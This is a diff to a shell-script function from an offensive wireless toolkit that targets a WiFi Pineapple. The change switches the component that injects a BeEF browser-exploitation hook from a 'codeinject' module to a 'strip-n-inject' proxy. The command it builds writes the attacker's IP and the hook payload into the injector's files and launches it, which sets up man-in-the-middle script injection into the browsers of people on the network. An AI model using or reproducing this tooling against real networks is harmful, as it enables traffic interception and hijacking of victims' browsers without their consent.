@@ -32,7 +32,7 @@ function start_beefhook(){
   echo -e "\e[01;34m[>]\e[00m Injecting BeEF Hook: ${hook_data}"  
    
    # Start up code injector for beef injection
-  command="killall -9 ruby ; echo ${our_ip} > /pineapple/components/infusions/codeinject/includes/resource/attacker_ip.txt ; echo \"${hook_data}\" > /pineapple/components/infusions/codeinject/includes/resource/injectme.txt ; cd /pineapple/components/infusions/codeinject/includes/ ; bash start.sh"
+  command="killall -9 python ; echo ${our_ip} > /pineapple/components/infusions/strip-n-inject/includes/proxy/attacker_ip.txt ; echo \"${hook_data}\" > /pineapple/components/infusions/strip-n-inject/includes/proxy/injection.txt ; cd /pineapple/components/infusions/strip-n-inject/includes/ ; bash start.sh"
   pineapple_command
  
 #   x-www-browser "http://127.0.0.1:3000/ui/panel" > /dev/null 2>&1 &
